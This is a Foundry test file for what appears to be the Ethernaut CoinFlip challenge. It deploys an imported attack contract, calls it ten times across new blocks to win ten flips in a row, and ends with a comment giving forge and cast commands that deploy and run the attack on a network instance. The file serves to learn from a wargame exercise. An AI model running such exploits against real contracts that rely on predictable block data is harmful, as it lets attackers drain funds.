// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {CoinFlipAttack} from "../solutions/CoinFlipAttack.sol";

contract CoinFlipTest is Test {
    CoinFlip public coinFlip;
    CoinFlipAttack public attackContract;
    address public attacker;

    function setUp() public {
        coinFlip = new CoinFlip();
        attacker = makeAddr("attacker");
    }

    function test_flip() public {
        vm.startPrank(attacker);

        // deploy attack contract
        attackContract = new CoinFlipAttack(address(coinFlip));

        for (uint256 i = 0; i < 10; i++) {
            attackContract.attack();
            vm.roll(block.number + 1); // wait for 1 block
        }

        assertEq(coinFlip.consecutiveWins(), 10);

        vm.stopPrank();
    }
}

/*
Instance address: 0xd669AaDd61216842D16CcdacF8D468Ccb6f4450c
source .env
export flip=0xd669AaDd61216842D16CcdacF8D468Ccb6f4450c
forge create solutions/CoinFlipAttack.sol:CoinFlipAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $flip
Attack contract address: 0x238B7480208F1466Dfe4F5DCeD6ED90B9Eff9d12
export attack=0x238B7480208F1466Dfe4F5DCeD6ED90B9Eff9d12
cast call $flip "consecutiveWins()" --rpc-url $RPC_URL
cast send $attack "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
